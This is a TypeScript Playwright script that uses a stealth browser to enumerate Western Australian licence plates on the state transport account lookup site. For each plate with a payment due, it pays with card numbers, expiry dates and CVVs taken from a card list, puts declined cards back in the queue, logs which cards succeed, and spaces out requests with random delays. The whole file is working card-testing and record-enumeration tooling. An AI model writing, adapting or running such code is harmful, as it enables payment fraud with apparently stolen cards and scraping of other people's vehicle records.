import { ConsoleMessage, Page, Browser } from 'playwright';
import * as fs from 'fs';
import * as path from 'path';
import { fileURLToPath } from 'url';
import { launchStealthBrowser } from '../shared/browser';

export {};

// --- Configuration & Paths ---
const currentDir = path.dirname(fileURLToPath(import.meta.url));
const rootDir = path.join(currentDir, '../../');
const dataDir = path.join(rootDir, 'data');
const hitsDir = path.join(rootDir, 'screenshots/hits');
const debugDir = path.join(rootDir, 'logs/debug');
const progressDir = path.join(rootDir, 'data/progress');
const logFile = path.join(dataDir, 'wa_hits_log.txt');
const waHitsFile = path.join(dataDir, 'wa_hits.json');
const waHitsTxt = path.join(dataDir, 'wa_hits.txt');
const cardsPath = path.join(dataDir, 'cards.txt');
const platesFile = path.join(dataDir, 'plates.txt');
const progressFile = path.join(progressDir, 'wa_current_index.txt');

// Ensure dirs
[hitsDir, debugDir, progressDir].forEach(d => {
  if (!fs.existsSync(d)) fs.mkdirSync(d, { recursive: true });
});

// --- Helpers ---

function logger(msg: string) {
  const timestamp = new Date().toISOString().split('T')[1].split('.')[0];
  const formatted = `[${timestamp}] ${msg}`;
  console.log(formatted);
  fs.appendFileSync(logFile, formatted + '\n');
}

async function gotoWithRetry(page: Page, url: string, retries = 3) {
  for (let i = 0; i < retries; i++) {
    try {
      await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 30000 });
      return true;
    } catch (e: any) {
      logger(`Navigation attempt ${i + 1} failed: ${e.message}`);
      if (i === retries - 1) throw e;
      await page.waitForTimeout(5000);
    }
  }
}

async function fillCardDetails(page: Page, card: string[]) {
  const [cc, mm, yy, cvv] = card;
  const selectors = {
    cc: ['input[name*="cardNumber"]', '#cardNumber', 'input[name*="card"]'],
    mm: ['select[name*="expiryMonth"]', 'input[name*="expiryMonth"]', '#expiryMonth'],
    yy: ['select[name*="expiryYear"]', 'input[name*="expiryYear"]', '#expiryYear'],
    cvv: ['input[name*="cvn"]', 'input[name*="cvv"]', '#cvv', '#cvn'],
    name: ['input[name*="cardholder"]', 'input[name*="name"]', '#nameOnCard']
  };

  const fill = async (name: string, list: string[], val: string) => {
    for (const sel of list) {
      try {
        const el = await page.$(sel);
        if (el && await el.isVisible()) {
          if (sel.startsWith('select')) {
            await page.selectOption(sel, { label: val.padStart(2, '0') }).catch(() => page.selectOption(sel, { value: val }));
          } else {
            await el.fill(val);
          }
          return true;
        }
      } catch {}
    }
    return false;
  };

  await fill('Name', selectors.name, 'Valued Customer');
  await fill('CC', selectors.cc, cc);
  await fill('MM', selectors.mm, mm);
  await fill('YY', selectors.yy, yy);
  await fill('CVV', selectors.cvv, cvv);
}

// --- Generator ---
let currentIndex = 0;
if (fs.existsSync(progressFile)) {
  currentIndex = parseInt(fs.readFileSync(progressFile, 'utf8').trim() || '0');
}

function genSequentialPlate() {
  const letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
  const suffix = currentIndex % 1000;
  const letterIndex = Math.floor(currentIndex / 1000);

  let n = letterIndex;
  const l3 = letters[n % 26];
  n = Math.floor(n / 26);
  const l2 = letters[n % 26];
  n = Math.floor(n / 26);
  const l1 = letters[n % 26];

  const plate = `1${l1}${l2}${l3}${suffix.toString().padStart(3, '0')}`;
  currentIndex++;
  if (currentIndex % 20 === 0) fs.writeFileSync(progressFile, currentIndex.toString());
  return plate;
}

function getNextPlate() {
  if (fs.existsSync(platesFile)) {
    const lines = fs.readFileSync(platesFile, 'utf8').trim().split('\n').filter(l => l.trim());
    if (lines.length > 0) {
      const plate = lines[0].trim();
      fs.writeFileSync(platesFile, lines.slice(1).join('\n'));
      return plate;
    }
  }
  return genSequentialPlate();
}

// --- Main Loop ---
(async () => {
  logger('=== WA Rego Checker Session Started ===');
  const { browser, context } = await launchStealthBrowser();
  const page = await context.newPage();

  page.on('pageerror', err => logger(`[PAGE ERROR] ${err.message}`));

  let hitsFound = 0;
  let attempts = 0;

  while (hitsFound < 20) {
    attempts++;
    const plate = getNextPlate();
    logger(`Checking ${plate} (Attempt ${attempts}, Hits ${hitsFound})`);

    try {
      await gotoWithRetry(page, 'https://online.transport.wa.gov.au/webExternal/accountlookup/');
      await page.waitForLoadState('networkidle', { timeout: 10000 });

      const plateInput = await page.waitForSelector('input[name="plateTextField"]', { timeout: 10000 });
      await page.fill('input[name="mdlNumberTextField"]', '');
      await plateInput.fill(plate);
      
      await page.click('button:has-text("Search"), input[type="submit"][value*="Search"]');
      await page.waitForTimeout(5000);

      const pageText = (await page.innerText('body')).toLowerCase();
      
      const isMiss = pageText.includes('cannot find') || pageText.includes('invalid') || pageText.includes('not found') || pageText.includes('no payments currently required');
      const isHit = pageText.includes('your account details') && !isMiss;

      if (isHit) {
        hitsFound++;
        logger(` → [HIT] ${plate} - Record found!`);
        
        const hitData = {
          plate,
          timestamp: new Date().toISOString(),
          details: pageText.includes('payment due') ? 'Payment Due' : 'Account Found',
          screenshot: `hit_${plate}.png`
        };

        // Append to JSON list
        let currentHits = [];
        if (fs.existsSync(waHitsFile)) {
          try { currentHits = JSON.parse(fs.readFileSync(waHitsFile, 'utf8')); } catch {}
        }
        currentHits.push(hitData);
        fs.writeFileSync(waHitsFile, JSON.stringify(currentHits, null, 2));
        
        // Also keep TXT for backward compatibility if needed by other scripts
        fs.appendFileSync(waHitsTxt, plate + '\n');
        
        const needsPayment = pageText.includes('payment due') || pageText.includes('outstanding') || pageText.includes('pay now') || pageText.includes('proceed to confirmation');
        if (needsPayment) {
          logger(` → [ACTION] Payment required for ${plate}. Attempting background checkout...`);
          
          if (fs.existsSync(cardsPath)) {
            const lines = fs.readFileSync(cardsPath, 'utf8').trim().split('\n');
            if (lines.length > 0) {
              const card = lines[0].split('|');
              fs.writeFileSync(cardsPath, lines.slice(1).join('\n'));
              
              try {
                const payBtn = await page.waitForSelector('button:has-text("Pay"), button:has-text("Proceed")', { timeout: 10000 });
                await payBtn.click();
                await page.waitForLoadState('networkidle');
                
                await fillCardDetails(page, card);
                await page.click('button[type="submit"], #payButton');
                await page.waitForTimeout(10000);
                
                const result = (await page.innerText('body')).toLowerCase();
                const success = result.includes('successful') || result.includes('thank you');
                logger(` → [PAYMENT] ${success ? 'SUCCESS' : 'FAILED'} for ${plate} using card ${card[0].slice(-4)}`);
                
                if (!success) fs.appendFileSync(cardsPath, `\n${card.join('|')}`); // Re-queue if failed
                await page.screenshot({ path: path.join(hitsDir, `paid_${plate}_${success ? 'ok' : 'fail'}.png`) });
              } catch (e: any) {
                logger(` → [ERROR] Checkout flow failed: ${e.message}`);
                fs.appendFileSync(cardsPath, `\n${card.join('|')}`);
              }
            }
          }
        }
        
        await page.screenshot({ path: path.join(hitsDir, `hit_${plate}.png`), fullPage: true });
      } else {
        if (attempts % 10 === 0) logger(`... processed 10 plates, current: ${plate}`);
      }

    } catch (e: any) {
      logger(` → [CRASH] Error on ${plate}: ${e.message}`);
      await page.screenshot({ path: path.join(debugDir, `crash_${plate}.png`) });
    }

    await page.waitForTimeout(3000 + Math.random() * 5000);
  }

  await browser.close();
  logger('=== Session Finished ===');
})();
